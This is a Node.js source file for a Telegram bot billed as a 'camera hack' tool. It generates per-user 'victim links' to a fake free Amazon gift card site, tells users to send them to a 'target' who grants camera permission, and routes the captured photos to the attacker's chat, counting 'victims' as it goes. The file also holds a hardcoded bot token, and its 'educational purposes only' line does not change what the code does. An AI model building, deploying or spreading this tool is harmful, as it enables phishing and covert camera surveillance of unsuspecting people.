#!/usr/bin/env node
/**
 * CAMERA HACK TELEGRAM BOT (Node.js)
 * Developed by: GENIUS HACKER ADITYA
 */

const { Telegraf, Markup } = require('telegraf');
const fs = require('fs');
const path = require('path');

// ============================================================
// 🔥 CONFIG — APNA BOT TOKEN DAALO
// ============================================================
const BOT_TOKEN = "8694051282:AAEiubd02kB0LHhpHTd5xAtromIRtiX7HEo";
const BASE_URL = "https://freegiftcard-amazon.netlify.app/";

// Social Media Links
const YOUTUBE_URL = "https://t.me/ROHAN0DJ";
const WHATSAPP_URL = "https://whatsapp.com/channel/0029Vb8psS872WToTkVa550i";
// ============================================================

// Store user data (in-memory)
const userLinks = {};
const userVerified = {};

// Helper function: Generate unique victim ID
function generateVictimId() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 8; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

// Helper function: Save link to file
function saveLink(userId, victimId, victimLink) {
    const data = `${userId}|${victimId}|${victimLink}\n`;
    fs.appendFileSync('links.txt', data, 'utf8');
}

// ============================================================
// BOT INSTANCE
// ============================================================
const bot = new Telegraf(BOT_TOKEN);

// ============================================================
// WELCOME SCREEN
// ============================================================
bot.start(async (ctx) => {
    const user = ctx.from;
    
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.url('📺 Join YouTube Channel', YOUTUBE_URL)],
        [Markup.button.url('💬 Join WhatsApp Group', WHATSAPP_URL)],
        [Markup.button.callback('✅ I Have Joined ✅', 'check_join')],
        [Markup.button.callback('🔹 Skip & Continue', 'skip_join')]
    ]);
    
    await ctx.replyWithMarkdown(
        `🎯 *WELCOME TO CAMERA HACK BOT*\n\n` +
        `👤 Hello *${user.first_name}*!\n\n` +
        `📌 *Before using this bot:*\n` +
        `1️⃣ Join our YouTube Channel\n` +
        `2️⃣ Join our WhatsApp Group\n` +
        `3️⃣ Click 'I Have Joined' to verify\n\n` +
        `⚡ *Or click 'Skip & Continue' to use directly!*\n\n` +
        `🔹 *Developed by GENIUS HACKER ADITYA*`,
        keyboard
    );
});

// ============================================================
// JOIN CHECK & VERIFICATION
// ============================================================
bot.action('check_join', async (ctx) => {
    await ctx.answerCbQuery();
    
    const userId = ctx.from.id;
    userVerified[userId] = true;
    
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('🎯 Generate Camera Hack Link', 'generate_link')],
        [Markup.button.url('📺 YouTube Channel', YOUTUBE_URL)],
        [Markup.button.url('💬 WhatsApp Group', WHATSAPP_URL)]
    ]);
    
    await ctx.editMessageText(
        `✅ *Verification Successful!*\n\n` +
        `🎉 You are now verified to use this bot.\n\n` +
        `📌 *Click the button below to generate your camera hack link.*\n\n` +
        `⚡ *Developed by GENIUS HACKER ADITYA*`,
        {
            parse_mode: 'Markdown',
            ...keyboard
        }
    );
});

bot.action('skip_join', async (ctx) => {
    await ctx.answerCbQuery();
    
    const userId = ctx.from.id;
    userVerified[userId] = true;
    
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.callback('🎯 Generate Camera Hack Link', 'generate_link')],
        [Markup.button.url('📺 YouTube Channel', YOUTUBE_URL)],
        [Markup.button.url('💬 WhatsApp Group', WHATSAPP_URL)]
    ]);
    
    await ctx.editMessageText(
        `⏭️ *Skipped Joining!*\n\n` +
        `✅ You can still use this bot freely.\n\n` +
        `📌 *Click the button below to generate your camera hack link.*\n\n` +
        `⚡ *Developed by GENIUS HACKER ADITYA*`,
        {
            parse_mode: 'Markdown',
            ...keyboard
        }
    );
});

// ============================================================
// GENERATE CAMERA HACK LINK
// ============================================================
bot.action('generate_link', async (ctx) => {
    await ctx.answerCbQuery();
    
    const userId = ctx.from.id;
    
    // Generate unique victim ID
    const victimId = generateVictimId();
    userLinks[userId] = victimId;
    
    // Create victim link
    const victimLink = `${BASE_URL}?id=${victimId}&chat_id=${userId}`;
    
    // Save to file
    saveLink(userId, victimId, victimLink);
    
    const keyboard = Markup.inlineKeyboard([
        [Markup.button.url('📤 Share Link', `https://t.me/share/url?url=${encodeURIComponent(victimLink)}`)],
        [Markup.button.callback('📋 Copy Link', 'copy_link')],
        [Markup.button.callback('🔄 New Link', 'generate_link')],
        [Markup.button.url('📺 YouTube', YOUTUBE_URL)],
        [Markup.button.url('💬 WhatsApp', WHATSAPP_URL)]
    ]);
    
    await ctx.editMessageText(
        `🎯 *CAMERA HACK LINK GENERATED!*\n\n` +
        `🆔 Victim ID: \`${victimId}\`\n\n` +
        `🔗 *Your Victim Link:*\n` +
        `\`${victimLink}\`\n\n` +
        `📌 *How to use:*\n` +
        `1️⃣ Share this link with your target\n` +
        `2️⃣ Target clicks and grants camera permission\n` +
        `3️⃣ Photo will be sent here automatically\n\n` +
        `⚠️ *Use for educational purposes only!*\n\n` +
        `⚡ *Developed by GENIUS HACKER ADITYA*`,
        {
            parse_mode: 'Markdown',
            ...keyboard
        }
    );
});

// ============================================================
// COPY LINK
// ============================================================
bot.action('copy_link', async (ctx) => {
    await ctx.answerCbQuery();
    
    const userId = ctx.from.id;
    const victimId = userLinks[userId] || '';
    
    if (!victimId) {
        await ctx.reply('❌ No link found. Use /start');
        return;
    }
    
    const victimLink = `${BASE_URL}?id=${victimId}&chat_id=${userId}`;
    
    await ctx.replyWithMarkdown(
        `📋 *Copy this link:*\n\n` +
        `\`${victimLink}\`\n\n` +
        `Send it to your target.\n\n` +
        `⚡ *GENIUS HACKER ADITYA*`
    );
});

// ============================================================
// STATS COMMAND
// ============================================================
bot.command('stats', async (ctx) => {
    const userId = ctx.from.id;
    const victimId = userLinks[userId] || 'Not generated';
    const verified = userVerified[userId] || false;
    
    // Count total victims from file
    let total = 0;
    try {
        const data = fs.readFileSync('links.txt', 'utf8');
        total = data.split('\n').filter(line => line.trim() !== '').length;
    } catch (error) {
        total = 0;
    }
    
    await ctx.replyWithMarkdown(
        `📊 *Your Stats*\n\n` +
        `🆔 Your Victim ID: \`${victimId}\`\n` +
        `📌 Total Victims: ${total}\n` +
        `✅ Verified: ${verified}\n\n` +
        `Type /start to get your link.`
    );
});

// ============================================================
// HELP COMMAND
// ============================================================
bot.command('help', async (ctx) => {
    await ctx.replyWithMarkdown(
        `🤖 *Camera Hack Bot*\n\n` +
        `📌 *Commands:*\n` +
        `/start - Welcome screen\n` +
        `/stats - Show stats\n` +
        `/help - Show this\n\n` +
        `📌 *How it works:*\n` +
        `1️⃣ Start bot → Welcome screen\n` +
        `2️⃣ Join or Skip → Get verified\n` +
        `3️⃣ Generate link → Share with target\n` +
        `4️⃣ Target clicks → Photo sent here\n\n` +
        `⚡ *Developed by GENIUS HACKER ADITYA*`
    );
});

// ============================================================
// LAUNCH BOT
// ============================================================
console.log(`
╔═══════════════════════════════════════════╗
║      CAMERA HACK TELEGRAM BOT (Node.js)   ║
║     Developed by: GENIUS HACKER ADITYA    ║
╚═══════════════════════════════════════════╝
`);
console.log('🤖 Bot starting...');
console.log('📺 YouTube: ' + YOUTUBE_URL);
console.log('💬 WhatsApp: ' + WHATSAPP_URL);
console.log('✅ Join check removed - everyone can use!');

bot.launch()
    .then(() => {
        console.log('✅ Bot is running!');
    })
    .catch((err) => {
        console.error('❌ Error starting bot:', err);
    });

// Enable graceful stop
process.once('SIGINT', () => {
    console.log('\n❌ Bot stopped');
    bot.stop('SIGINT');
});
process.once('SIGTERM', () => {
    console.log('\n❌ Bot stopped');
    bot.stop('SIGTERM');
});
